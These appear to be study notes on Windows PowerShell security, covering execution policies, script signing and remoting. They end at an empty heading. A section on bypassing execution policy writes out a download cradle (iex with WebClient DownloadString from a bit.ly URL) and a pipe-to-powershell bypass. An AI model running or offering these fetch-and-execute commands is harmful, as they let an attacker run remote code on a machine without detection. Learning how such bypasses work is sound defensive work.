# PowerShell Security Notes

### 1. Windows PowerShell Architecture
![enter image description here](https://i-msdn.sec.s-msft.com/dynimg/IC13468.gif)
For example, Windows operating system includes also a graphical hosting application PowerShell_ISE.exe (Windows PowerShell Integrated Scripting Environment) that allows you to read, write, run, debug, and test scripts and modules in a graphic-assisted environment.
### 1.2 Runspaces
A runspace defines the context in which a PowerShell commands or scripts execute and contains state that is specific to the corresponding PowerShell session. This context represents the operating environment of the runspace, including such resources as startup scripts as well as commands, language elements, functions, and providers supported by the hosting application.
It is possible to create **constrained runspaces** by restricting scope of resources, such as providers, commands, language elements, or functions available from the within the corresponding Windows PowerShell session.
### 1.3 PowerShell commands
There are many varieties of commands, including cmdlets, functions, filters, scripts, applications, configurations, and workflows.
### 1.4 PowerShell modules
A module is a collection of related Windows PowerShell code, including scripts, scripting resources, and assemblies grouped together and residing typically in the same file system location.
**cmdlet**
>**Import-Module**
### 1.5 Windows PowerShell providers
Windows PowerShell relies on providers to facilitate access to different types of data and configuration stores.
Some of the more commonly used providers available in Windows PowerShell enable access to file system, registry, and environment variables.
For example, the Registry provider allows you to access hives and keys in a registry, and the HKLM and HKCU drives specify the corresponding hives within the registry.
![enter image description here](https://i-msdn.sec.s-msft.com/dynimg/IC54683.gif)

### 1.5 Windows PowerShell Workflow
A Windows PowerShell Workflow is a Windows PowerShell script that leverages Windows Workflow Foundation. Windows Workflow Foundation is a framework for development and management of complex processing tasks that provides such capabilities as asynchronous execution, parallelism, and checkpoint support.
Windows PowerShell Workflow dynamically converts Windows PowerShell cmdlets to workflow activities. Each activity constitutes an independent unit of execution.
### 1.6 PowerShell.exe syntax
PowerShell\[.exe\]
```
[-Command { - | <script-block> [-args <arg-array>]

| <string> [<CommandParameters>] } ]

[-EncodedCommand <Base64EncodedCommand>]

[-ExecutionPolicy <ExecutionPolicy>]

[-File <FilePath> [<Args>]]

[-InputFormat {Text | XML}] 

[-Mta]

[-NoExit]

[-NoLogo]

[-NonInteractive] 

[-NoProfile] 

[-OutputFormat {Text | XML}] 

[-PSConsoleFile <FilePath> | -Version <PowerShell version>]

[-Sta]

[-WindowStyle <style>]
```
### 1.6 PowerShell.exe syntax
- Command_ (or simply c)
The value of the parameter can be "-", a string, or a script block. If the value is "-", the command text is read from standard input.
You can use the call operator **(&)** to execute a command within the script block
	>**powershell.exe –c “& {Get-EventLog –LogName Security –Newest 10}”**

	**Invoke-Expression** cmdlet (frequently referenced via its **iex** alias)
	> **powershell.exe –c iex “’Get-EventLog –LogName Security –Newest 10’”**
- _EncodedCommand_ (or simply enc) - accepts a base-64-encoded string version of a command. This allows you to submit commands to PowerShell that require more complex combinations of quotation marks or curly braces. This parameter is also frequently used in obfuscation scenarios, in which an attacker wants to prevent detection of an actual Windows PowerShell script or command being executed.
- _File_ \- runs the specified script in the local scope, so that the functions and variables that the script creates are available in the current session.
- _NoExit_ \- does not exit after running commands specified by using the Command parameter.
- _NonInteractive_ (or simply noni) – runs Windows PowerShell session without an interactive shell.
- _NoProfile_ (or simply nop) - does not load the PowerShell profile. PowerShell profiles allow you to customize your Windows PowerShell sessions.
- _Version_ (or simply v) – allows starting Windows PowerShell 2.0, assuming that this version is present on the local computer. Specifying any version number higher than 2 will load the latest version of Windows PowerShell present on the local computer, regardless of the number specified.
- _WindowsStyle_ (or simply w) – sets the window style for the session. When set to Hidden, it allows running a Windows PowerShell session without displaying the console window (the window does actually appear for a brief moment when the session starts).
### 1.7 Windows PowerShell Execution Policy
he most basic protection mechanism against such exploit is a set of execution policies that is part of the Windows PowerShell runtime. The purpose of execution policies is to block unintended execution of Windows PowerShell scripts, rather than serve as the primary method of preventing intentional script-based exploits. The execution policy might provide some protection against less-sophisticated social engineering-based attacks, where unsuspecting users are deceived into launching a harmful Windows PowerShell script.

Windows PowerShell supports the following execution policy:
- Restricted. No scripts are allowed to run. The blocked scripts include formatting and configuration files (.ps1xml), module script files (.psm1), and Windows PowerShell profiles (.ps1). It is the default execution policy in Windows client operating systems and had been the default in Windows server operating systems until the release of Windows Server 2012.
- AllSigned. Only scripts that have been digitally signed by a trusted publisher are allowed to run. If a script has been signed by an untrusted publisher, you will be prompted to provide a confirmation before that script executes.
- RemoteSigned. You can run:
any local scripts
remote scripts that have been digitally signed by a trusted publisher

	The mechanism that detects whether a script is local or remote leverages alternate data streams (ADS), built into the file system (NTFS). ADS appends the ZoneIdentifer tag into the data ($DATA) attribute of files downloaded from the Internet. The value of the tag designates the zone from which the file originated. Scripts with the values of the ZoneIdentfier tag designating the Internet or restricted sites are considered to be remote by the RemoteSigned policy. To remove the tag, you can use the **Unblock-File** Windows PowerShell cmdlet.
- Unrestricted. You can run any local or remote script. However, when launching remote scripts that have not been signed by a trusted publisher, you will be prompted to provide a confirmation before that script executes.
- Bypass. You can run all scripts without any restrictions or prompts. The Bypass policy can be applied within an individual Windows PowerShell session, effectively eliminating impact of any computer or user-based policy.
- Undefined. This indicates that there is no execution policy set in the current scope. As the result, the effective policy depends on the operating system defaults (Restricted in Windows 10 and RemoteSigned in Windows Server 2016).
### 1.1.8 Execution Policy Scopes
You can apply an execution policy to the Process, CurrentUser, and LocalMachine scopes.
- With the Process scope, the execution policy affects the current session. Setting gets stored in the $env:PSExecutionPolicyPreference environment variable and it is deleted when the session is closed. The setting is not stored in the registry. 
Change it by running the Set-ExecutionPolicy cmdlet with the Scope parameter set to Process:
>**Set-ExecutionPolicy -ExecutionPolicy <policy_name> -Scope Process**
Starting a new Windows PowerShell session:
>**powershell.exe -ExecutionPolicy <policy_name>**
- With the CurrentUser scope, the execution policy affects the current user.
>**Set-ExecutionPolicy -ExecutionPolicy <policy_name> -Scope CurrentUser**
- With the LocalMachine scope, the execution policy affects all users on the local computer.
>**Set-ExecutionPolicy -ExecutionPolicy <policy_name> -Scope LocalMachine**

You also have the option of applying execution policy to individual users or to all users on the local computer by using Computer Configuration or User Configuration of Group Policy. These two options correspond, respectively, to the MachinePolicy and UserPolicy scopes.

Windows PowerShell evaluates the execution policies in the following precedence order:
-   Group Policy: Computer Configuration (MachinePolicy)
-   Group Policy: User Configuration (UsePolicy)
-   Execution Policy: Process
-   Execution Policy: CurrentUser
-   Execution Policy: LocalMachine

To list all of the execution policies that affect the current session and display them in their precedence order, run the following:
>**Get-ExecutionPolicy -List**
###  1.1.9 Configuring Execution Policy via Group Policy
The Computer and User Configuration Group Policy settings are stored under in the ExecutionPolicy REG\_SZ entry in the 
> HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell

and 
> HKEY\_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell

registry keys, respectively.

To configure Windows PowerShell Execution Policy settings in a Group Policy Object, use the PowerShellExecutionPolicy.adm or PowerShellExecutionPolicy.admx Group Policy template.

The configuration of Turn on Script Execution policy settings applies in the following manner:
-   If you disable Turn on Script Execution, then the resulting execution policy is set to Restricted.
-   If you enable Turn on Script Execution, you can select one of the execution policies. The Group Policy settings are equivalent to the following execution policies.
	- Allow all scripts: Unrestricted
	- Allow local scripts and remote signed scripts: RemoteSigned
	- Allow only signed scripts: AllSigned
-   If Turn on Script Execution is not configured, it has no effect. Instead, the effectively execution policy can be set by using the methods described in the previous topic.
###  1.1.10 Digitally signing Windows PowerShell scripts
It becomes necessary to develop a process of digitally signing legitimate scripts. 

>_! Note that this process must consider the need to apply digital signature following any script modifications._

To add a digital signature to a script, you must have a code signing certificate issued by a Certification Authority (CA) that is trusted by all the computers where the script will be executed. In a fully managed, on-premises environment, this can be an internal CA. In Internet scenarios, there is typically a need for the use of a public CA.

You add a digital signature by using the Set-AuthenticodeSignature cmdlet as shown below:
> **$cert = Get-ChildItem -Path “Cert:\\CurrentUser\\My” -CodeSigningCert
Set-AuthenticodeSignature -FilePath “C:\\Scripts\\MyScript.ps1” -Certificate $cert**
###  1.1.11 # Bypassing Windows PowerShell Execution Policy
The most straightforward approach involves eliminating the use of scripts, replacing them with any other execution method that Windows PowerShell offers. 
These methods include:
-   Executing the content of the script directly from an interactive Windows PowerShell session.    
-   Using the Invoke-Command cmdlet with the ScriptBlock parameter. This is not significantly different from the first approach as far as the ease of use is concerned, since in either case you need to interactively type the content of the script.
- Extracting the content of the script by using the Get-Content cmdlet and piping the output directly into powershell.exe with the Command parameter set to -.

`Get-Content .\\script.ps1 | powershell.exe –NoProfile –Command -`

or simply:

`gc .\\script.ps1 | powershell –nop -`

-   Downloading the script from any web location and executing the downloaded script directly in memory. A very common variant of this approach, referred to as download cradle involves running the Invoke-Expression cmdlet to initiate an instance of Net.WebClient class and using its DownloadString method to download the script into memory. That script is, in turn, referenced by the Command parameter of powershell.exe. This approach is illustrated by the following example:

`powershell.exe –NoProfile –Command “Invoke-Expression(New-Object Net.WebClient).DownloadString(‘http://bit.ly/5cr1pT.p5I’)”`

or simply:

`powershell –nop –c “iex(New-Object Net.WebClient).DownloadString(‘http://bit.ly/5cr1pT.p5I’)”`
## 1.2. Managing remote execution capabilities of Windows PowerShell
### 1.2.1 Windows PowerShell built-in remoting capabilities
The second stage of an exploit that managed to successfully compromise a local host typically involves lateral movement, leveraging connectivity to other hosts on the same network to extend the scope of impact.
Many Windows PowerShell cmdlets offer built-in remoting capabilities that rely on traditional communication mechanisms which are part of the Windows operating system, including Remote Procedure Calls (RPC), Distributed Component Object Model (DCOM), and Remote Registry service. For example, Get-WmiObject uses Remote Procedure Calls (RPCs) and Get-Process communicates with the computer’s Remote Registry Service. These mechanisms are not firewall-friendly, since they typically require a wide-range of ports to be opened to function in remoting scenarios.
Some of the most popular and relevant from the security standpoint cmdlets in this category include:
-   Restart-Computer
-   Stop-Computer
-   Clear-EventLog
-   Get-EventLog
-   Get-HotFix
-   Limit-EventLog
-   New-EventLog
-   Remove-EventLog
-   Show-EventLog
-   Get-Process
-   Get-Service
-   Set-Service
-   Get-WinEvent
### 1.2.2  WMI and CIM-based remoting capabilities
WMI and CIM are related technologies. CIM is a newer technology that is based on open, cross-platform standards. Both are based on specifications defined by the Distributed Management Task Force (DMTF). 
Both technologies provide a way to connect to a common information model repository (also known as the CIM or WMI repository). The repository contains management settings and data that you can query and manipulate. Data in the repository is organized into namespaces that represent different aspects of the local computer system configuration, including its hardware, software, components, roles, services, and user settings. CIM and WMI allow you to identify and control virtually every aspect of an operating system environment.
-   Register-WmiEvent
-   Get-WmiObject
-   Remove-WmiObject
-   Set-WmiInstance
-   Invoke-WmiMethod
-   Get-CimAssociatedInstance
-   Get-CimClass
-   Register-CimIndicationEvent
-   Get-CimInstance
-   New-CimInstance
-   Remove-CimInstance
-   Set-CimInstance
-   Invoke-CimMethod
-   Get-CimSession
-   New-CimSession
-   New-CimSessionOption
-   Remove-CimSession

CIM provides cross-platform capabilities, with support for three kinds of connections:
-   Connections to the local computer, which use either the Distributed Component Object Model (DCOM) or the Web Services for Management (WS-MAN) protocol depending on the cmdlet you use.
-   Ad-hoc connections to a remote computer, which always use the WS-MAN protocol.
-   Session-based connections to a remote computer, which can use either DCOM or WS-MAN.

CIM-based DCOM connections target the WMI service that is part of the Windows operating system. CIM-based WS-MAN connections target the Windows Remote Management (WinRM) service, which is part of the Windows Management Framework and which facilitates Windows PowerShell remoting

WinRM is installed by default on computers running Windows 7 and newer as well as Windows Server 2008 R2 and newer. Note that CIM cmdlets do not rely in any way on Windows PowerShell Remoting or Windows PowerShell on the target computer.

WMI relies exclusively on DCOM for remote connectivity.

WMI relies exclusively on DCOM for remote connectivity. Just as with CIM-based DCOM connections, DCOM interacts with the WMI service. By default, the WMI service runs as part of a shared service host with ports assigned through DCOM. DCOM uses the remote procedure call (RPC) protocol, which, as mentioned earlier, is not firewall-friendly. However, you can set up the WMI service to run as the only process in a separate host and specify a fixed port. For details regarding this configuration, refer to [https://msdn.microsoft.com/en-us/library/bb219447(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/bb219447(v=vs.85).aspx) . WMI cmdlets do not support session-based connections. These cmdlets support only ad-hoc connections over DCOM.

**Microsoft considers the WMI cmdlets within Windows PowerShell to be deprecated, although the underlying WMI repository is still a current technology.** You should rely primarily on CIM cmdlets, and use WMI cmdlets only if necessary, for example when dealing with legacy operating systems.
### 1.2.3 Fundamentals of Windows PowerShell Remoting
#### Remoting architecture
Windows PowerShell Remoting uses an open standard protocol called Web Services for Management (WS-Management), which relies on HTTP and HTTPS as its transport protocols.
Remoting must be enabled on remote computers for them to be able to accept incoming connections.

WinRM service must include one or more listeners.

Incoming connection requests include a packet header that indicates the intended destination, or endpoint. Each endpoint is associated with a specific application, and when traffic is directed to an endpoint, WinRM starts the associated application, directs to it the incoming traffic, and waits for the application to complete its task. The application then passes data back to WinRM and WinRM transmits the data back to the origin of the request.

The target application associated with these endpoints is implemented as the Windows PowerShell host process (Wsmprovhost.exe). Windows PowerShell engine, running within the Wsmprovhost.exe process space on the remote computer performs requested tasks and converts (or serializes) resulting objects into the XML format. The XML text stream is then passed back to WinRM, which transmits it to the originating computer. Windows PowerShell on the source computer de-serializes the XML stream into Windows PowerShell objects.

Windows PowerShell can register multiple endpoints (session configurations) with WinRM. By default, WinRM on a 64-bit operating system will contain a separate endpoint for the 64-bit and for 32-bit Windows PowerShell host.
#### Remoting security
By default, the Windows PowerShell endpoints allow connections originated by members of designated groups only. On Windows Server 2016 and Windows 10, these groups include Remote Management Users and Administrators. On earlier operating system versions, these permissions are limited to members of the local Administrators group only. You can modify the default settings by configuring System Access Control List (SACL) for individual endpoints.

The default remoting behavior is to use the security context of the Windows PowerShell session on the originating computer. However, you have the option of specifying alternative credentials when you initiate a connection. The remote computer uses either implicit (based on the security context of the originating session) or explicitly specified credentials to impersonate the corresponding user to carry out the requested tasks. If you have enabled auditing, each of these tasks will be audited and associated with the corresponding credentials.

Relying on impersonation for remote administration involves some security risks. For example, it is conceivable that an attacker managed to intercept your remoting request directed to a specific computer to capture your credentials. To mitigate this risk, remoting by default requires mutual authentication between the local and remote computers.

Mutual authentication is a native feature of the Active Directory Kerberos authentication protocol, and when you connect between trusted domain computers, mutual authentication occurs automatically.

The TrustedHosts list is a local WinRM setting, intended to accommodate remoting to computers for which mutual authentication is not feasible. In general, you should avoid using TrustedHosts and instead configure workgroup computer to use HTTPS. In a domain environment, you can enforce TrustedHosts configuration by using Group Policy.
#### Enabling remoting




